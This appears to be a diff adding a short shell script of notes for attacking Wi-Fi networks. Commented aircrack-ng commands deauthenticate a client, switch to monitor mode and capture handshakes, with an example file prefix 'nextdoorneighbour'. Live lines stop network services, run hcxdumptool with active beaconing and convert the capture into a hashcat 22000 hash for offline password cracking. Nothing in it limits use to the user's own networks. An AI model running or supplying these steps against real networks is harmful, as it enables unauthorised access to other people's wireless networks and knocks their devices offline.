@@ -1,0 +1,41 @@
+#!/bin/sh
+
+# AIRCRACK
+# Kick a client
+#sudo aireplay-ng -0 1 -a <mac of AP> -c <mac of client> <interfacename>
+
+# Show networks
+#iwlist <interfacename> scan
+
+# Switch to monitor mode with aircrack
+#sudo systemctl stop wpa_supplicant
+#sudo systemctl stop NetworkManager
+#sudo ifconfig wlan0 down
+#sudo iwconfig wlan0 mode monitor
+#sudo ifconfig wlan0 up
+#sudo airmon-ng start wlan0 #<channel> 
+
+# Start scan
+#sudo airodump-ng -c <channel> --bssid <mac of AP> -w prefix <interfacename>
+# -c is the channel e.g. -c 11
+# --bssid is the MAC address of the wifi access point e.g. --bssid AA:AA:AA:AA:AA
+# -w is a prefix for the files that airodump-ng will product e.g. -w nextdoorneighbour
+
+# Switch back to managed mode
+#sudo ifconfig wlan0 down
+#sudo iwconfig wlan0 mode managed
+#sudo ifconfig wlan0 up
+#sudo systemctl start wpa_supplicant
+#sudo systemctl start NetworkManager
+
+# HCXDUMPTOOL
+
+sudo systemctl stop wpa_supplicant
+sudo systemctl stop NetworkManager
+
+hcxdumptool -i interface -o dumpfile.pcapng --active_beacon --enable_status=15
+
+# Convert hash to hc22000
+hcxpcapngtool -o hash.hc22000 dumpfile.pcapng
+
+
